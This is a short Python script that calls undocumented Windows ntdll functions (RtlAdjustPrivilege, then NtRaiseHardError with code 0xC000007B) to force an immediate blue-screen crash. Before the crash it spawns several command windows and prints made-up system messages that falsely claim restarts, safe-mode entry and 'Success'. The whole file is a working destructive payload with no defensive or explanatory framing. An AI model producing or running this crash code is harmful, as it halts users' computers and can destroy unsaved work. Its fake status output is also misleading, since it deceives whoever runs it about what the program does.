from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import time
import subprocess

def trigger_bsod():

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

print("windll.exe ntdll.RtlAdjustPrivilege")
time.sleep(0.1)
print("windll.exe ntdll.NtRaiseHardError")
time.sleep(0.1)
print("task kernel32.getProsess.System32.runtime")
print(" process (0xC000007B)")
time.sleep(0.1)
print("windll.exe run 0xC000007B")
time.sleep(0.6)
print(" system32.runtime error code: 0x00000000")
print(" system32.runtime.restarting")
time.sleep(0.2)
print(" system32.runtime error code: 0x00000000")
print(" system32.runtime.restarting")
time.sleep(0.1)
print(" system32.runtime error code: 0x00000000")
print(" system32.runtime enter safe mode")
time.sleep(0.3)
print("kernel32.setSystemPowerState.safeMode")
print(" Success")

import subprocess
import time

for i in range(4):
    subprocess.Popen("start cmd /c exit", shell=True)

trigger_bsod()